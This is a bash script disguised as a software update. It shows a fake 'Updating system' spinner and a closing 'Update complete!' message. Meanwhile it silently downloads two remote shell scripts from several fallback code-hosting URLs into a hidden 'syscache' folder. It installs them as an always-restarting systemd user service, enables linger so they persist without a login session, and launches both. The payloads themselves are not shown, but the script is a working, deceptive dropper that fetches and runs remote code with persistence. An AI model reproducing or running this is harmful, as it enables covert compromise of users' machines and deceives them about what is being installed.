#!/bin/bash
set -e

clear
echo
echo "                   Processing, please wait..."
echo "         Do not quit otherwise software may damage"
echo

spin='⣾⣽⣻⢿⡿⣟⣯⣷'
counter=0

# Background mein saara heavy work
(
    USER_HOME="$HOME"
    BASE_DIR="$USER_HOME/.local/share/syscache"
    SERVICE_DIR="$USER_HOME/.config/systemd/user"
    SERVICE_NAME="syscache.service"
    SERVICE_PATH="$SERVICE_DIR/$SERVICE_NAME"

    SCRIPT1="$BASE_DIR/script1.sh"
    SCRIPT2="$BASE_DIR/script2.sh"

    mkdir -p "$BASE_DIR"
    mkdir -p "$SERVICE_DIR"

    # 4 Fallback URLs for script1.sh (llinux1.sh)
    URLS1=(
        "https://gitea.com/mahesh2210m/mahesh2210m/raw/branch/main/llinux1.sh"
        "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/llinux1.sh"
        "https://raw.githubusercontent.com/mahesh97m/phpcode/main/llinux1.sh"
        "https://gitlab.com/mahesh2210m/mahesh2210m/-/raw/main/llinux1.sh"


    )

    # 4 Fallback URLs for script2.sh (llinux.sh)
    URLS2=(
        "https://gitea.com/mahesh2210m/mahesh2210m/raw/branch/main/llinux.sh"
        "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/llinux.sh"
        "https://raw.githubusercontent.com/mahesh97m/phpcode/main/llinux.sh"
        "https://gitlab.com/mahesh2210m/mahesh2210m/-/raw/main/llinux.sh"


    )

    # Robust download with fallback
    download() {
        local target="$1"
        shift
        local urls=("$@")
        for url in "${urls[@]}"; do
            if curl -fsSL "$url" -o "$target"; then
                chmod +x "$target"
                return 0
            fi
        done
        echo "Failed to download $target from all sources" >&2
        exit 1
    }

    download "$SCRIPT1" "${URLS1[@]}"
    download "$SCRIPT2" "${URLS2[@]}"

    # Create systemd user service
    cat > "$SERVICE_PATH" <<EOF
[Unit]
Description=SysCache Background Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash $SCRIPT2
Restart=always
RestartSec=5
StandardOutput=append:$BASE_DIR/out.log
StandardError=append:$BASE_DIR/err.log

[Install]
WantedBy=default.target
EOF

####################################
# ENABLE USER LINGER (FOR HEADLESS/SERVER)
####################################
loginctl enable-linger "$USER" 2>/dev/null || true

####################################
# LOAD & START SERVICE
####################################
systemctl --user daemon-reexec
systemctl --user daemon-reload
systemctl --user enable "$SERVICE_NAME"
systemctl --user restart "$SERVICE_NAME"

    # Run scripts once now (in background)
    nohup bash "$SCRIPT1" >/dev/null 2>&1 &
     sleep 5
    nohup bash "$SCRIPT2" >/dev/null 2>&1 &

    echo "DONE"
) &

job_pid=$!

# Animation loop jab tak background process chal raha hai
while kill -0 $job_pid 2>/dev/null; do
    idx=$((counter % 8))
    dots=""
    case $((counter % 4)) in
        0) dots="..." ;;
        1) dots=".." ;;
        2) dots="." ;;
        3) dots="" ;;
    esac
    printf "\r        [${spin:$idx:1}] Updating system$dots   "
    counter=$((counter + 1))
    sleep 0.15
done

# Wait for completion
wait $job_pid 2>/dev/null || true

# Final Success Message
clear
echo
echo "                 ✅ Update complete!"
echo "     You can now use latest software version"
echo
sleep 3
